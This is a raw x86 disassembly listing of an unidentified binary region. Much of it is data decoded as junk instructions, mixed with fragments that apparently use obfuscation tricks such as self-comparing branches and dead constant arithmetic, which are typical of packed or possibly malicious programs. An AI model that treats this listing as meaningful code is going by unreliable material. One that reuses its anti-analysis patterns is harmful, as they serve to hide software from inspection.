  41a584:	adc    BYTE PTR [esi+0x5a9b469f],cl
  41a58a:	fmul   DWORD PTR [ebx+edi*8+0x3ba50e6b]
  41a591:	sti    
  41a592:	clc    
  41a593:	(bad)  
  41a594:	mov    dl,BYTE PTR [edi+0x249becbd]
  41a59a:	xchg   ebx,eax
  41a59b:	xchg   edi,eax
  41a59c:	push   es
  41a59d:	scas   eax,DWORD PTR es:[edi]
  41a59e:	ret    
  41a59f:	sbb    edi,DWORD PTR [eax+eax*1-0x66]
  41a5a3:	add    al,0xcf
  41a5a5:	and    cl,BYTE PTR ds:0xe7309dbe
  41a5ab:	and    al,0x13
  41a5ad:	mov    dl,0xeb
  41a5af:	cdq    
  41a5b0:	xchg   BYTE PTR [edi],ch
  41a5b2:	ffree  st(0)
  41a5b4:	add    BYTE PTR [eax],ah
  41a5b6:	out    dx,al
  41a5b7:	mov    al,0x7d
  41a5b9:	push   esi
  41a5ba:	mov    al,ds:0x4cee16ec
  41a5bf:	jns    0x41a572
  41a5c1:	mov    edx,DWORD PTR [esp+0x1c]
  41a5c5:	shrd   ecx,edx,0x2
  41a5c9:	xor    ecx,eax
  41a5cb:	mov    eax,DWORD PTR [esp+0x18]
  41a5cf:	shl    eax,0x1e
  41a5d2:	shr    edx,0x2
  41a5d5:	mov    edx,DWORD PTR [esp+0x1c]
  41a5d9:	xor    eax,eax
  41a5db:	or     eax,ecx
  41a5dd:	mov    ecx,DWORD PTR [esp+0x68]
  41a5e1:	mov    DWORD PTR [ecx],eax
  41a5e3:	mov    eax,DWORD PTR [esp+0x68]
  41a5e7:	mov    ecx,DWORD PTR [esp+0x68]
  41a5eb:	mov    eax,DWORD PTR [eax]
  41a5ed:	cmp    eax,DWORD PTR [ecx]
  41a5ef:	jne    0x41a916
  41a5f5:	mov    eax,DWORD PTR [esp+0x5c]
  41a5f9:	mov    ecx,DWORD PTR [esp+0x5c]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	cmp    eax,DWORD PTR [ecx]
  41a601:	jne    0x41a916
  41a607:	mov    BYTE PTR [esp+0x2c],0x20
  41a60c:	mov    BYTE PTR [esp+0x38],0x3
  41a611:	jmp    0x41a86e
  41a616:	cs lock pop ebp
  41a619:	jne    0x41a5ba
  41a61b:	js     0x41a653
  41a61d:	mov    eax,0x90d3c3ca
  41a622:	mov    eax,ds:0x7cdd303c
  41a627:	and    eax,eax
  41a629:	mov    esi,0xbebec235
  41a62e:	test   DWORD PTR [ecx-0x55e17382],eax
  41a634:	lock ret 0xc168
  41a638:	(bad)  
  41a639:	fmul   st(0),st
  41a63b:	sub    ebx,DWORD PTR [edi-0x70]
  41a63e:	inc    esi
  41a63f:	shl    DWORD PTR [eax-0x10],0xe8
  41a643:	(bad)  
  41a644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a645:	loope  0x41a5d4
  41a647:	inc    esi
  41a648:	pop    esp
  41a649:	nop
  41a64a:	dec    esp
  41a64b:	ins    BYTE PTR es:[edi],dx
  41a64c:	in     al,dx
  41a64d:	cmp    dl,BYTE PTR [edi+0x33]
  41a650:	jbe    0x41a650
  41a652:	cli    
  41a653:	and    esp,DWORD PTR [ebx]
  41a655:	jo     0x41a5f1
  41a657:	adc    eax,0x95ecc2fc
  41a65c:	stos   BYTE PTR es:[edi],al
  41a65d:	lahf   
  41a65e:	xchg   eax,eax
  41a660:	loope  0x41a62d
  41a662:	outs   dx,BYTE PTR ds:[esi]
  41a663:	and    DWORD PTR [edi],0x198c671d
  41a669:	sub    al,0x8d
  41a66b:	jl     0x41a694
  41a66d:	xor    dl,BYTE PTR [ebx+0x17a9284]
  41a673:	(bad)
  41a677:	lods   eax,DWORD PTR ds:[esi]
  41a678:	xor    dh,BYTE PTR [ecx-0x2dd66f32]
  41a67e:	dec    ebp
  41a67f:	jo     0x41a6db
  41a681:	ret    
  41a682:	out    dx,al
  41a683:	xlat   BYTE PTR ds:[ebx]
  41a684:	push   ss
  41a685:	rol    BYTE PTR [ebx],1
  41a687:	(bad)  
  41a688:	daa    
  41a689:	pop    eax
  41a68a:	xor    bl,ch
  41a68c:	push   ecx
  41a68d:	jno    0x41a695
  41a68f:	jae    0x41a6ca
  41a691:	xor    BYTE PTR [eax],0x8
  41a694:	fwait
  41a695:	inc    eax
  41a696:	adc    cl,BYTE PTR [ecx-0x42]
  41a699:	loope  0x41a69d
  41a69b:	out    dx,al
  41a69c:	into   
  41a69d:	xchg   ebx,eax
  41a69e:	cmp    eax,ebp
  41a6a0:	into   
  41a6a1:	test   esp,ecx
  41a6a3:	mov    esi,0xfab38d6a
  41a6a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6a9:	push   0x65145f95
  41a6ae:	enter  0xaea8,0x90
  41a6b2:	add    DWORD PTR [ebx],0x7d793553
  41a6b8:	jle    0x41a6fd
  41a6ba:	jmp    0xc432038
  41a6bf:	mov    eax,0x1f913ea8
  41a6c4:	push   0xbefd92d
  41a6c9:	fwait
  41a6ca:	mov    ah,0x7b
  41a6cc:	mov    bl,0x22
  41a6ce:	and    bh,BYTE PTR [ebx+0x53]
  41a6d1:	dec    edi
  41a6d2:	jg     0x41a65a
  41a6d4:	adc    edi,DWORD PTR [eax]
  41a6d6:	cs xchg ebp,eax
  41a6d8:	fsub   st,st(4)
  41a6da:	in     al,0x28
  41a6dc:	and    DWORD PTR [ebp+0x36],edi
  41a6df:	adc    eax,esp
  41a6e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6e2:	xchg   ebp,eax
  41a6e3:	rcl    BYTE PTR [edx-0x77b8132f],1
  41a6e9:	cmp    al,BYTE PTR [ebx]
  41a6eb:	cdq    
  41a6ec:	(bad)  
  41a6ed:	push   edx
  41a6ee:	aam    0xd0
  41a6f0:	arpl   WORD PTR [edi],di
  41a6f2:	xchg   edi,eax
  41a6f3:	and    ah,cl
  41a6f5:	jge    0x41a774
  41a6f7:	fisub  DWORD PTR [eax+0x2b8b59d5]
  41a6fd:	icebp  
  41a6fe:	inc    esi
  41a6ff:	dec    bx
  41a701:	sbb    DWORD PTR [edx-0x6dcbff55],ecx
  41a707:	sub    ebx,ebx
  41a709:	adc    BYTE PTR [edi+0x21],ah
  41a70c:	mov    edx,0x131136ed
  41a711:	(bad)  
  41a712:	jmp    0xec824745
  41a717:	js     0x41a6ff
  41a719:	mov    ds:0xb6d0c045,eax
  41a71e:	lods   eax,DWORD PTR ds:[esi]
  41a71f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a721:	pop    edx
  41a722:	loope  0x41a6d5
  41a724:	pop    ecx
  41a725:	sbb    eax,0x98f4dcf4
  41a72a:	mov    gs,ebx
  41a72c:	jmp    0x41a6b7
  41a72e:	push   eax
  41a72f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a730:	iret   
  41a731:	or     eax,0x4063f4c5
  41a736:	jmp    0x7dea:0x758dd099
  41a73d:	or     al,al
  41a73f:	clc    
  41a740:	push   ecx
  41a741:	adc    DWORD PTR [ecx+0x13e72b18],ebp
  41a747:	mov    DWORD PTR [esp+ebx*8-0xe2da2b1],0xa1c640a4
  41a752:	pop    DWORD PTR fs:[edx*8+0x786f5484]
  41a75a:	cmp    ebx,DWORD PTR [ebx+0x7ececf75]
  41a760:	dec    ebp
  41a761:	js     0x41a75e
  41a763:	jle    0x41a73c
  41a765:	add    ebx,DWORD PTR [ebp+0x0]
  41a768:	pusha  
  41a769:	cmp    al,0x33
  41a76b:	fld    TBYTE PTR [eax+0x21]
  41a76e:	push   ebx
  41a76f:	sub    al,0xb1
  41a771:	sub    BYTE PTR ss:[edx+0x1306a9fc],dl
  41a778:	stos   DWORD PTR es:[edi],eax
  41a779:	jno    0x41a7a0
  41a77b:	repz pop es
  41a77d:	add    al,0xa1
  41a77f:	and    DWORD PTR [eax+0x70],ebx
  41a782:	lds    edi,FWORD PTR [ebx]
  41a784:	push   cs
  41a785:	retf   
  41a786:	and    BYTE PTR [ebx],0xae
  41a789:	or     DWORD PTR [ebx-0x239b40c9],edi
  41a78f:	mov    ah,0x8e
  41a791:	pop    ecx
  41a792:	mov    dl,0x2c
  41a794:	xchg   esp,eax
  41a795:	aas    
  41a796:	imul   DWORD PTR [esi+0x253e1a7e]
  41a79c:	xor    eax,ecx
  41a79e:	inc    eax
  41a79f:	int    0x98
  41a7a1:	push   es
  41a7a2:	jecxz  0x41a7e1
  41a7a4:	ja     0x41a783
  41a7a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7a7:	repnz sbb DWORD PTR [eax-0x189ad3b7],esi
  41a7ae:	into   
  41a7af:	inc    ebp
  41a7b0:	adc    esi,edx
  41a7b2:	std    
  41a7b3:	xchg   ebp,eax
  41a7b4:	add    DWORD PTR [ebx+0x14],0xd7b0b36f
  41a7bb:	mov    eax,0xa900844
  41a7c0:	popa   
  41a7c1:	xor    al,0x2e
  41a7c3:	(bad)  
  41a7c4:	sbb    BYTE PTR [ecx-0x5f],dh
  41a7c7:	xchg   edx,eax
  41a7c8:	mov    esi,0xd91dbe4b
  41a7cd:	sbb    edi,ecx
  41a7cf:	stos   DWORD PTR es:[edi],eax
  41a7d0:	inc    ecx
  41a7d1:	xlat   BYTE PTR ds:[ebx]
  41a7d2:	mov    cl,BYTE PTR [ebp+0x4e]
  41a7d5:	or     DWORD PTR [edx],esp
  41a7d7:	pop    ebx
  41a7d8:	cmp    BYTE PTR ds:0xa87e72ab,cl
  41a7de:	nop
  41a7df:	or     ebx,DWORD PTR [ecx]
  41a7e1:	lock adc eax,0xc6989d23
  41a7e7:	pop    es
  41a7e8:	xor    eax,0xd463c2a8
  41a7ed:	and    eax,0x126a0983
  41a7f2:	push   eax
  41a7f3:	lea    ebx,[edx+eiz*2]
  41a7f6:	js     0x41a789
  41a7f8:	mov    edx,0x85f00a3a
  41a7fd:	add    eax,0x7c86be44
  41a802:	aam    0x53
  41a804:	adc    cx,WORD PTR ss:[edi-0x1955c1c4]
  41a80c:	push   es
  41a80d:	retf   
  41a80e:	xchg   ebp,eax
  41a80f:	mov    bh,0x55
  41a811:	jno    0x41a833
  41a813:	neg    BYTE PTR [edx+edx*1+0x27]
  41a817:	ret    
  41a818:	dec    eax
  41a819:	enter  0x444e,0x5a
  41a81d:	pop    edi
  41a81e:	inc    edi
  41a81f:	inc    edx
  41a820:	mov    WORD PTR [edx-0x5d4db2a2],es
  41a826:	out    dx,eax
  41a827:	push   ecx
  41a828:	inc    ecx
  41a829:	lds    esi,FWORD PTR [edi+0x1f1f1afb]
  41a82f:	or     eax,0x81968265
  41a834:	popa   
  41a835:	xchg   edx,eax
  41a836:	adc    BYTE PTR [eax],al
  41a838:	in     eax,0x80
  41a83a:	dec    ebx
  41a83b:	sub    al,0x26
  41a83d:	inc    ebp
  41a83e:	mov    eax,0xc4339002
  41a843:	and    BYTE PTR [ecx-0x137e57da],0xe7
  41a84a:	gs sub edx,edi
  41a84d:	push   ss
  41a84e:	or     eax,0xae3156c4
  41a853:	imul   ebx,esi,0x763008f7
  41a859:	pop    edi
  41a85a:	mov    ch,0x63
  41a85c:	fwait
  41a85d:	sub    ebx,DWORD PTR [ecx]
  41a85f:	inc    edi
  41a860:	mov    DWORD PTR [eax-0x28aad751],0xe7d20975
  41a86a:	push   esp
  41a86b:	xor    BYTE PTR [ebx],0xe0
  41a86e:	mov    BYTE PTR [esp+0x3c],0x6d
  41a873:	mov    BYTE PTR [esp+0x2b],0x90
  41a878:	mov    al,BYTE PTR [esp+0x2b]
  41a87c:	mov    cl,BYTE PTR [esp+0x3c]
  41a880:	or     al,0xdc
  41a882:	sub    al,cl
  41a884:	mov    cl,BYTE PTR [esp+0x38]
  41a888:	sub    al,0x56
  41a88a:	movzx  eax,al
  41a88d:	movzx  ecx,cl
  41a890:	cdq    
  41a891:	idiv   ecx
  41a893:	movzx  ecx,BYTE PTR [esp+0x2c]
  41a898:	or     eax,ecx
  41a89a:	mov    BYTE PTR [esp+0xc],al
  41a89e:	mov    BYTE PTR [esp+0x24],0x1
  41a8a3:	mov    BYTE PTR [esp+0x2b],0xcf
  41a8a8:	mov    BYTE PTR [esp+0x3c],0x6
  41a8ad:	mov    BYTE PTR [esp+0x38],0x25
  41a8b2:	mov    BYTE PTR [esp+0x2c],0xf8
  41a8b7:	mov    al,BYTE PTR [esp+0x2c]
  41a8bb:	mov    cl,BYTE PTR [esp+0x38]
  41a8bf:	or     al,0xc4
  41a8c1:	and    al,cl
  41a8c3:	mov    cl,BYTE PTR [esp+0x3c]
  41a8c7:	imul   cl
  41a8c9:	mov    cl,BYTE PTR [esp+0x2b]
  41a8cd:	movzx  ecx,cl
  41a8d0:	movzx  eax,al
  41a8d3:	and    eax,ecx
  41a8d5:	mov    cl,BYTE PTR [esp+0x24]
  41a8d9:	movzx  ecx,cl
  41a8dc:	cdq    
  41a8dd:	idiv   ecx
  41a8df:	mov    cl,BYTE PTR [esp+0xc]
  41a8e3:	cmp    cl,al
  41a8e5:	je     0x41a93c
  41a8eb:	lea    eax,[esp+0x9c]
  41a8f2:	push   eax
  41a8f3:	lea    edi,[esp+0x80]
  41a8fa:	call   0x40b68c
  41a8ff:	cmp    eax,ebx
  41a901:	jne    0x41a93c
  41a907:	cmp    edx,esi
  41a909:	jne    0x41a93c
  41a90f:	xor    eax,eax
  41a911:	jmp    0x41b43e
  41a916:	mov    eax,DWORD PTR [esp+0x70]
  41a91a:	mov    ecx,DWORD PTR [esp+0x74]
  41a91e:	mov    edx,DWORD PTR [esp+0x18]
  41a922:	mov    edi,DWORD PTR [esp+0x1c]
  41a926:	add    eax,edx
  41a928:	adc    ecx,edi
  41a92a:	mov    DWORD PTR [esp+0x18],eax
  41a92e:	mov    DWORD PTR [esp+0x1c],ecx
  41a932:	jmp    0x41a93c
  41a937:	mov    ebx,0xcb79b576
  41a93c:	push   0x4
  41a93e:	push   0x4226f8
  41a943:	lea    eax,[esp+0x6c]
  41a947:	push   eax
  41a948:	call   0x411c08
  41a94d:	mov    eax,DWORD PTR [esp+0x64]
  41a951:	push   0x4
  41a953:	push   DWORD PTR [eax+0x1a4]
  41a959:	lea    eax,[esp+0x74]
  41a95d:	push   eax
  41a95e:	call   0x411c08
  41a963:	mov    eax,DWORD PTR [esp+0x64]
  41a967:	mov    eax,DWORD PTR [eax+0x1a4]
  41a96d:	mov    eax,DWORD PTR [eax]
  41a96f:	mov    ecx,DWORD PTR [esp+0x64]
  41a973:	mov    eax,DWORD PTR [eax+0x3c]
  41a976:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41a97c:	mov    ecx,DWORD PTR [ecx]
  41a97e:	lea    eax,[ecx+eax*1+0x28]
  41a982:	mov    eax,DWORD PTR [eax]
  41a984:	add    DWORD PTR [esp+0x6c],eax
  41a988:	mov    DWORD PTR [esp+0x30],0x127
  41a990:	mov    DWORD PTR [esp+0x10],0x421a
  41a998:	mov    eax,DWORD PTR [esp+0x10]
  41a99c:	jmp    0x41abf9
  41a9a1:	add    BYTE PTR [edx-0x4b9c4ca1],al
  41a9a7:	adc    al,0xb2
  41a9a9:	sub    eax,0xd8d15a28
  41a9ae:	fs js  0x41a943
  41a9b1:	repz sub eax,eax
  41a9b4:	mov    esi,0xbebec235
  41a9b9:	lock fs lahf 
  41a9bc:	fcmovbe st,st(3)
  41a9be:	das    
  41a9bf:	clc    
  41a9c0:	and    ch,BYTE PTR [edx+0x74]
  41a9c3:	cmp    BYTE PTR [ebx+0x4fc1841b],0x81
  41a9ca:	test   bh,dl
  41a9cc:	dec    edi
  41a9cd:	and    eax,0x4d63bfd1
  41a9d2:	repz sub eax,0x7c39081a
  41a9d8:	add    al,0x26
  41a9da:	push   esp
  41a9db:	(bad)  
  41a9dc:	xacquire xchg BYTE PTR [edx+edi*2],al
  41a9e0:	mov    bl,0x90
  41a9e2:	mov    DWORD PTR [ebx+0x26],0x86349b62
  41a9e9:	in     eax,0xaf
  41a9eb:	jmp    0x9b0c0804
  41a9f0:	in     al,dx
  41a9f1:	sub    DWORD PTR [esi+0x70ece8d1],0xffffffa7
  41a9f8:	outs   dx,BYTE PTR ds:[esi]
  41a9f9:	push   esp
  41a9fa:	repnz dec eax
  41a9fc:	xor    DWORD PTR [esi+0x11cefc1],esi
  41aa02:	stos   DWORD PTR es:[edi],eax
  41aa03:	outs   dx,BYTE PTR ds:[esi]
  41aa04:	or     eax,0x824eb44d
  41aa09:	mov    cs,esp
  41aa0b:	stos   DWORD PTR es:[edi],eax
  41aa0c:	push   ss
  41aa0d:	dec    ch
  41aa0f:	push   0xd19570ad
  41aa14:	mov    ecx,0xe791bcd6
  41aa19:	mov    edx,0x9d983ce
  41aa1e:	push   ss
  41aa1f:	ja     0x41aa28
  41aa21:	(bad)  
  41aa22:	sti    
  41aa23:	jno    0x41aa80
  41aa25:	push   esp
  41aa26:	mov    esi,0xd3a4a0c5
  41aa2b:	mov    bh,0x87
  41aa2d:	mov    ch,0x8a
  41aa2f:	or     eax,ebp
  41aa31:	and    BYTE PTR [ecx+esi*2],dl
  41aa34:	add    eax,0x4fc8bec7
  41aa39:	pusha  
  41aa3a:	xchg   edi,eax
  41aa3b:	adc    ecx,ebx
  41aa3d:	jns    0x41aabd
  41aa3f:	cld    
  41aa40:	cdq    
  41aa41:	mov    BYTE PTR [ecx+eiz*8],ch
  41aa44:	xchg   esi,eax
  41aa45:	popa   
  41aa46:	pop    esi
  41aa47:	frstor ds:0xe7ffaa4e
  41aa4d:	into   
  41aa4e:	in     al,dx
  41aa4f:	push   ds
  41aa50:	adc    DWORD PTR [ebx],ebx
  41aa52:	lock dec edi
  41aa54:	div    bl
  41aa56:	daa    
  41aa57:	(bad)  
  41aa58:	nop
  41aa59:	retf   0x9ded
  41aa5c:	scas   al,BYTE PTR es:[edi]
  41aa5d:	dec    eax
  41aa5e:	or     eax,0x2f792fe4
  41aa63:	jbe    0x41aabe
  41aa65:	int3   
  41aa66:	mov    dh,ch
  41aa68:	dec    esi
  41aa69:	pop    es
  41aa6a:	inc    eax
  41aa6b:	cmp    eax,0x3e4d0a9e
  41aa70:	mov    fs,WORD PTR [eax+esi*1+0x7f]
  41aa74:	inc    ecx
  41aa75:	mov    bl,0x6d
  41aa77:	xchg   BYTE PTR [ebx-0x60dd1f58],al
  41aa7d:	mov    bh,0xe1
  41aa7f:	pop    es
  41aa80:	pop    ebx
  41aa81:	in     eax,0xda
  41aa83:	dec    ebp
  41aa84:	lea    eax,[edx-0x1997624]
  41aa8a:	ins    DWORD PTR es:[edi],dx
  41aa8b:	xchg   esi,eax
  41aa8c:	test   eax,0x7314e46b
  41aa91:	push   edi
  41aa92:	loope  0x41aa2e
  41aa94:	dec    esp
  41aa95:	stc    
  41aa96:	ja     0x41aaa3
  41aa98:	push   ebx
  41aa99:	ret    
  41aa9a:	and    eax,0xc78997f4
  41aa9f:	pop    edx
  41aaa0:	retf   0x3476
  41aaa3:	push   es
  41aaa4:	xchg   ebx,eax
  41aaa5:	mov    cl,0x79
  41aaa7:	stc    
  41aaa8:	cld    
  41aaa9:	cmc    
  41aaaa:	sbb    BYTE PTR fs:[ebp+0x4ccdb91],0xe7
  41aab2:	dec    edx
  41aab3:	add    ecx,DWORD PTR [esi+ecx*4]
  41aab6:	xlat   BYTE PTR ds:[ebx]
  41aab7:	xchg   ebp,eax
  41aab8:	xchg   esp,esp
  41aaba:	sbb    ebp,DWORD PTR [eax+edi*1]
  41aabd:	push   cs
  41aabe:	aad    0x80
  41aac0:	pop    ebp
  41aac1:	inc    edx
  41aac2:	cmp    DWORD PTR [ebx],esi
  41aac4:	nop
  41aac5:	fs ret 0x6ba4
  41aac9:	mov    esi,0xea3ac264
  41aace:	sub    DWORD PTR ds:0x2fdde157,esi
  41aad4:	inc    edx
  41aad5:	mov    cl,0x20
  41aad7:	mov    esp,0xb676c2ac
  41aadc:	mov    cl,0x7c
  41aade:	fldcw  WORD PTR [ebx+ebp*2]
  41aae1:	je     0x41ab03
  41aae3:	sti    
  41aae4:	fwait
  41aae5:	push   0x1e
  41aae7:	xor    edi,DWORD PTR [ecx+0x75]
  41aaea:	(bad)  
  41aaeb:	aas    
  41aaec:	sbb    BYTE PTR [ebx],ah
  41aaee:	loope  0x41aac8
  41aaf0:	fidivr WORD PTR ds:0xc36973c2
  41aaf6:	mov    ah,BYTE PTR [esi+0x7a]
  41aaf9:	push   0x58e2f651
  41aafe:	inc    edi
  41aaff:	sub    esi,0x51
  41ab02:	sar    bx,cl
  41ab05:	outs   dx,DWORD PTR ds:[esi]
  41ab06:	inc    ebx
  41ab07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab08:	fisubr WORD PTR [ecx-0x73f062a6]
  41ab0e:	mov    esp,0x4f35df9c
  41ab13:	popf   
  41ab14:	inc    ebx
  41ab15:	jg     0x41aaad
  41ab17:	sub    ah,BYTE PTR [esi+0x10e5afad]
  41ab1d:	and    cl,BYTE PTR [ecx+0x17fce607]
  41ab23:	add    al,0x8b
  41ab25:	xor    DWORD PTR [ebp-0x2a],ebx
  41ab28:	dec    BYTE PTR [ebx-0xd28a468]
  41ab2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab2f:	inc    ebp
  41ab30:	push   ss
  41ab31:	add    ch,dh
  41ab33:	pop    eax
  41ab34:	cld    
  41ab35:	adc    eax,DWORD PTR [ebp+0x46]
  41ab38:	jns    0x41ab0e
  41ab3a:	mov    esp,0xa889ba96
  41ab3f:	gs push edi
  41ab41:	and    BYTE PTR [ebx],dl
  41ab43:	inc    esi
  41ab44:	pop    edi
  41ab45:	pop    esi
  41ab46:	cdq    
  41ab47:	hlt    
  41ab48:	(bad)  
  41ab49:	jg     0x41abb7
  41ab4b:	pop    ecx
  41ab4c:	dec    ecx
  41ab4d:	pop    ebp
  41ab4e:	xchg   ebx,eax
  41ab4f:	sub    cl,ah
  41ab51:	jmp    FWORD PTR [ecx-0x70f3cedd]
  41ab57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab58:	fcomp  QWORD PTR [edi-0x3d]
  41ab5b:	test   BYTE PTR [edx+0x2c],ah
  41ab5e:	ins    BYTE PTR es:[edi],dx
  41ab5f:	ins    BYTE PTR es:[edi],dx
  41ab60:	fisubr WORD PTR [esp+eiz*2-0x76b9d542]
  41ab67:	loope  0x41ab7c
  41ab69:	in     al,0x5a
  41ab6b:	js     0x41abad
  41ab6d:	cmp    al,0x4
  41ab6f:	shr    DWORD PTR [edx+0x7a],0xc2
  41ab73:	fdivr  QWORD PTR [edi+ebp*2+0x27dfe595]
  41ab7a:	pop    esp
  41ab7b:	mov    bh,0x69
  41ab7d:	dec    eax
  41ab7e:	xchg   edi,eax
  41ab7f:	pop    es
  41ab80:	xchg   ebp,eax
  41ab81:	retf   
  41ab82:	add    DWORD PTR [edi],esp
  41ab84:	xchg   ebp,eax
  41ab85:	and    dl,dh
  41ab87:	out    0xc6,al
  41ab89:	dec    edx
  41ab8a:	ins    BYTE PTR es:[edi],dx
  41ab8b:	fstp   DWORD PTR [ebx]
  41ab8d:	and    eax,0x9b5e618b
  41ab92:	mov    dl,0xcc
  41ab94:	jae    0x41ab42
  41ab96:	inc    ebx
  41ab97:	inc    ebx
  41ab98:	mul    ebx
  41ab9a:	movhps xmm3,QWORD PTR [ebx]
  41ab9d:	jge    0x41ab81
  41ab9f:	out    0x3a,eax
  41aba1:	cmp    DWORD PTR [edx],0x47dbfe4
  41aba7:	fwait
  41aba8:	push   0x53
  41abaa:	ins    DWORD PTR es:[edi],dx
  41abab:	fdiv   DWORD PTR [ebp+0x71]
  41abae:	popa   
  41abaf:	loope  0x41abaa
  41abb1:	enter  0xa5cf,0xa9
  41abb5:	not    DWORD PTR [edx*1+0x56780887]
  41abbc:	mov    WORD PTR [ebx-0x13],fs
  41abbf:	aad    0xac
  41abc1:	es add al,0x26
  41abc4:	xchg   esi,eax
  41abc5:	xchg   BYTE PTR [edi],cl
  41abc7:	mov    ecx,0xc86d6d66
  41abcc:	lods   eax,DWORD PTR ds:[esi]
  41abcd:	aas    
  41abce:	bound  eax,QWORD PTR [edx]
  41abd0:	push   ds
  41abd1:	test   eax,0x46fda611
  41abd6:	push   ebp
  41abd7:	mov    bh,BYTE PTR [ebp-0x57d0d01]
  41abdd:	mov    ch,0x3c
  41abdf:	xchg   edi,eax
  41abe0:	jmp    0x2a5f4332
  41abe5:	xor    DWORD PTR [edx+0x75a31818],esp
  41abeb:	jmp    0x41abc7
  41abed:	cmp    eax,ebp
  41abef:	or     DWORD PTR [eax],0x11
  41abf2:	mov    ds:0xa84b5f88,eax
  41abf7:	and    al,0x23
  41abf9:	and    eax,0xffffc244
  41abfe:	add    eax,DWORD PTR [esp+0x30]
  41ac02:	and    eax,0xfffffe5a
  41ac07:	jmp    0x41ae64
  41ac0c:	xor    DWORD PTR [edi-0x1f],ebp
  41ac0f:	frstor [esp+esi*2+0x1832b431]
  41ac16:	test   bh,cl
  41ac18:	and    esi,DWORD PTR [ecx+0x2d6b924a]
  41ac1e:	sar    BYTE PTR [esi-0x41413dcb],0x7f
  41ac25:	stos   DWORD PTR es:[edi],eax
  41ac26:	sti    
  41ac27:	fidiv  DWORD PTR [ecx]
  41ac29:	mov    dh,0x52
  41ac2b:	lods   al,BYTE PTR ds:[esi]
  41ac2c:	sbb    DWORD PTR [eax+0x2b],esi
  41ac2f:	pop    edi
  41ac30:	ror    cl,0xb1
  41ac33:	popa   
  41ac34:	xor    ebx,DWORD PTR [ebx-0x32]
  41ac37:	ss (bad) 
  41ac39:	mov    esp,0x1894c987
  41ac3e:	pop    edi
  41ac3f:	add    eax,0xb247847a
  41ac44:	in     al,dx
  41ac45:	in     al,dx
  41ac46:	mov    edi,0xb2b88c8d
  41ac4b:	push   es
  41ac4c:	out    0xf2,eax
  41ac4e:	(bad)  
  41ac4f:	cmp    al,0xce
  41ac51:	out    dx,al
  41ac52:	(bad)  
  41ac53:	neg    BYTE PTR [ecx]
  41ac55:	mov    ch,0x41
  41ac57:	in     al,0xa9
  41ac59:	out    0xee,eax
  41ac5b:	icebp  
  41ac5c:	cmp    ecx,DWORD PTR [ecx-0x44cc75b8]
  41ac62:	popa   
  41ac63:	out    dx,eax
  41ac64:	and    al,0x41
  41ac66:	das    
  41ac67:	js     0x41ac09
  41ac69:	mov    eax,ds:0xdb16c5c9
  41ac6e:	dec    ebx
  41ac6f:	inc    ecx
  41ac70:	mov    cl,0xa
  41ac72:	mov    eax,0x4a075da8
  41ac77:	mov    edi,DWORD PTR ds:0x9c1afabe
  41ac7d:	dec    eax
  41ac7e:	in     eax,0x69
  41ac80:	(bad)  
  41ac81:	cmp    al,bh
  41ac83:	test   eax,0xe97253b6
  41ac88:	push   ebp
  41ac89:	fld    st(7)
  41ac8b:	pop    ebp
  41ac8c:	cmp    DWORD PTR [edx],ecx
  41ac8e:	jl     0x41acfa
  41ac90:	add    al,0x4d
  41ac92:	out    0xc2,al
  41ac94:	push   esi
  41ac95:	(bad)
  41ac99:	jbe    0x41acb1
  41ac9b:	cli    
  41ac9c:	cmp    eax,0xbb9e8da4
  41aca1:	xor    eax,0x33b8fffa
  41aca6:	iret   
  41aca7:	clc    
  41aca8:	jno    0x41ac7e
  41acaa:	jp     0x41ac53
  41acac:	sub    esi,DWORD PTR [esi-0x1f9fe971]
  41acb2:	not    DWORD PTR [edi-0x7918d196]
  41acb8:	ror    DWORD PTR ds:0x94cf6e77,cl
  41acbe:	jne    0x41ad0d
  41acc0:	int    0xf4
  41acc2:	pop    es
  41acc3:	out    0x5,al
  41acc5:	(bad)  
  41acc6:	mov    ebx,0x8acdd76
  41accb:	(bad)  
  41accc:	jp     0x41ad36
  41acce:	push   es
  41accf:	lds    ebx,FWORD PTR [eax+0x50]
  41acd2:	cwde   
  41acd3:	inc    ebp
  41acd4:	mov    ch,0x2f
  41acd6:	dec    esp
  41acd7:	stc    
  41acd8:	rcl    BYTE PTR [eax],cl
  41acda:	xchg   edi,eax
  41acdb:	mov    BYTE PTR [esi+edi*4-0x6c],dh
  41acdf:	mov    al,0x26
  41ace1:	test   BYTE PTR [eax-0x34],bh
  41ace4:	ja     0x41ad06
  41ace6:	jecxz  0x41ac7c
  41ace8:	mov    ebx,0xd0d54835
  41aced:	dec    edx
  41acee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acef:	popf   
  41acf0:	sub    DWORD PTR ss:[ebx],edx
  41acf3:	je     0x41aca2
  41acf5:	sub    eax,0xd51e35dc
  41acfa:	enter  0x7712,0xc4
  41acfe:	stos   BYTE PTR es:[edi],al
  41acff:	add    ebx,DWORD PTR [edi]
  41ad01:	xchg   edi,eax
  41ad02:	js     0x41ace5
  41ad04:	cs xchg edx,eax
  41ad06:	mov    esp,0x239f16d4
  41ad0b:	sub    BYTE PTR [esi-0x35],cl
  41ad0e:	pop    es
  41ad0f:	in     al,dx
  41ad10:	cmp    ebp,ecx
  41ad12:	stos   DWORD PTR es:[edi],eax
  41ad13:	sahf   
  41ad14:	jmp    0xcdf27780
  41ad19:	test   BYTE PTR [ebp+0x3dedf34c],bh
  41ad1f:	dec    edi
  41ad20:	jmp    0xd42a:0x50a60354
  41ad27:	out    0x1c,eax
  41ad29:	xor    ah,BYTE PTR [ebp+ebp*4-0x47340008]
  41ad30:	xchg   edx,eax
  41ad31:	fdivr  DWORD PTR [eax-0x5d]
  41ad34:	loopne 0x41acf5
  41ad36:	adc    BYTE PTR cs:[eax+esi*8],al
  41ad3a:	fsubr  QWORD PTR [esi+0x1b]
  41ad3d:	and    BYTE PTR [eax+0x5787a262],bh
  41ad43:	cmp    ebx,ebp
